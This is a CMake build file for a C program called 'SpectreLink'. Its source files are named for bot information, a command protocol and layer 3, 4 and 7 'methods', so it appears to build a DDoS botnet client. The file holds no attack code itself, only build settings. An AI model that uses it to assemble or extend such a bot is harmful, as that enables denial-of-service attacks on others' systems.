cmake_minimum_required(VERSION 3.18)
project(SpectreLink DESCRIPTION "SpectreLink" VERSION 1.0 LANGUAGES C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED OFF)
set(CMAKE_C_EXTENSIONS OFF)

add_executable(
        ${PROJECT_NAME}
        src/main.c
        src/utils/socket.c
        src/utils/urlparser.c
        src/utils/spectre_time.c
        src/utils/socket.c
        src/utils/debug.c
        src/utils/common.c
        src/proto/bot_info.c
        src/proto/connection.c
        src/proto/deserializer.c
        src/proto/protocol.c
        src/methods/layer3.c
        src/methods/layer4.c
        src/methods/layer7.c
)

include_directories(${PROJECT_NAME} PRIVATE
        src/proto/includes
        src/bot/includes
        src/methods/includes
        src/utils/includes
)

find_package(Threads REQUIRED)
target_link_libraries(${PROJECT_NAME} Threads::Threads)

add_definitions(-DBOT_VERSION="${CMAKE_PROJECT_VERSION}")

if (WIN32)
    target_link_libraries(${PROJECT_NAME} ws2_32)
endif()

if ("${CMAKE_BUILD_TYPE}" STREQUAL "Debug")
    add_definitions(-DDEBUG)
else ()
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Wall -Werror -Wextra -Wno-unused-parameter -Wno-unused-function -Wno-unused-variable -Wno-missing-field-initializers -Wno-missing-braces -Wno-unused-result")
endif()